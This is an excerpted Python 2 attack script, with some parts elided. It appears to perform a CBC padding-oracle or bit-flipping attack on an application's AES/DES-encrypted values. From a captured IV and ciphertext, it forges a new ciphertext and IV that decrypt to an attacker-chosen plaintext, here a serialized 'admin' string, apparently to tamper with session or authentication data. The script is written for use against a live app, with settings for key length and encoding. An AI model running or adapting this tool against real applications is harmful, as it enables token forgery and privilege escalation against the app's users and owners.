...
def reset_key(key,stdlen):
  key_len = len(key)
  padding = []
  if key_len < stdlen:
    diff_len = stdlen - key_len
    for i in range(0,diff_len):
      padding.append('\x00')
    key = key + ''.join("%s" % ch for ch in padding)
    return key
  if stdlen >= key_len:
    return key[0:stdlen]

# you can choose attack_mode : keyKnown/keyUnknown
attack_mode = "keyKnown"
...
cipher = "AES"
# if you choose AES , please select the secret_key : 16(AES-128)/24(AES-196)/32(AES-256)
aes_key_len = 16

########################################
# reset the secret_key
if attack_mode == "keyKnown":
  if cipher.lower() == "des":
    if len(ENCKEY) != 8:
      ENCKEY = reset_key(ENCKEY,8)
  elif cipher.lower() == "aes":
    if len(ENCKEY) != aes_key_len:
      ENCKEY = reset_key(ENCKEY,aes_key_len)
  elif cipher.lower() == "des3":
    if len(ENCKEY) != 16:
      ENCKEY = reset_key(ENCKEY,16)
########################################
...
def main(args):
  ...
  print "=== 2011.9 ==="
  print "=============="
  print "=== modify by porlock ==="
  print "=== porlock@qq.com ==="
  print "=== 2018.5 ==="
  print 
 
  ######################################## 
  # you may config this part by yourself
  iv = '2dIBgyWzV3hjQYuVTNQY9A%3D%3D'
  plain = '123'
  plain_want = 's:5:"admin";'
  # if the attack_mode == keyUnknown, set the CIPHERTEXT you get from the app
  CIPHERTEXT = 'oEiUV9pNOL%2FdEm3Pb5CpkA%3D%3D'
  # you can choose input_plain hex system : DEC/HEX (sometimes you can only get the HEX of plain)
  hex_system = "DEC"
  # iv_input_mode : base64/urlencode/base64urlencode/hex/nothing (for invisible characters , sometimes iv will encode , you need to decode it)
  iv_input_mode = "base64urlencode"
  # result_output_mode : base64/urlencode/base64urlencode/hex/nothing (it depend on what the app accept)
  result_output_mode = "base64urlencode"
  ########################################
  iv = io_mode(iv,"input",iv_input_mode)
  ...
  if attack_mode == "keyKnown":
    ...
    if not ciphertext:
      print "[-] Encrypt Error!"
      return False
  elif attack_mode == "keyUnknown":
    ciphertext = io_mode(CIPHERTEXT,"input",iv_input_mode)
  ...
  if guess:
    ...
    if plain_want:
      ...
      if en:
        ...
        print "[+] The ciphertext you want is: "+ io_mode(en[block_size:],"output",result_output_mode)
        # print "[+] IV is: "+hex_s(en[:block_size])
        print "[+] IV is: "+ io_mode(en[:block_size],"output",result_output_mode)
        print
...
def io_mode(str,io,mode):
  if io == "input":
    if mode == "base64urlencode":
      return base64.b64decode(urllib.unquote(str))
    elif mode == "hex":
      return hex_s(str)
    elif mode == "nothing":
      return str
    ...
    if mode == "base64urlencode":
      return urllib.quote(base64.b64encode(str))
    elif mode == "hex":
      return hex_s(str)
    elif mode == "nothing":
      return str
